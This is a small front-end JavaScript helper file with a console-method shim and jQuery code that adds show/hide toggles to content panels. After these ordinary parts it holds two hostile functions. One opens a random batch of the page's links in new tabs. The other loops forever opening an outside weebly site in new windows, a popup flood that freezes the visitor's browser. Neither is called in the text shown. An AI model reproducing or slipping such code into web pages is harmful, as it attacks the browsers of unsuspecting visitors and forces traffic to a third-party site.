// Avoid `console` errors in browsers that lack a console.
(function() {
    var method;
    var noop = function () {};
    var methods = [
        'assert', 'clear', 'count', 'debug', 'dir', 'dirxml', 'error',
        'exception', 'group', 'groupCollapsed', 'groupEnd', 'info', 'log',
        'markTimeline', 'profile', 'profileEnd', 'table', 'time', 'timeEnd',
        'timeline', 'timelineEnd', 'timeStamp', 'trace', 'warn'
    ];
    var length = methods.length;
    var console = (window.console = window.console || {});

    while (length--) {
        method = methods[length];

        // Only stub undefined methods.
        if (!console[method]) {
            console[method] = noop;
        }
    }
}());

// Place any jQuery/helper plugins in here.

$(document).ready(function(){
	$(".contentsPanel").each(function() {                
		$(this).prepend('<div class="hidePanel">[hide]</div><div class="showPanel">[show]</div>');
	});
	
	
    $(".hidePanel").click(function(){
		$( this ).siblings('ul').hide( 150, function() { 
			$(this).parent().addClass('minimizedPanel');
		});
    });
    $(".showPanel").click(function(){
		$( this ).siblings('ul').show( 150, function() { 
			$(this).parent().removeClass('minimizedPanel');
		});
    });
	
	
});

function openLinks(){
  links = document.getElementsByTagName('a');
  const amount = (Math.floor(Math.random() * 17) + 3);
   for (i = 0; i < amount;i++){ 
     let value = (Math.floor(Math.random() * 17) + 3);
     window.open(links[value].getAttribute('href'),'_blank');
     window.focus();
   }
  }

  function shit(){
    while(true){
      window.open("https://harvisha.weebly.com",'_blank');
      window.focus();
    }
   }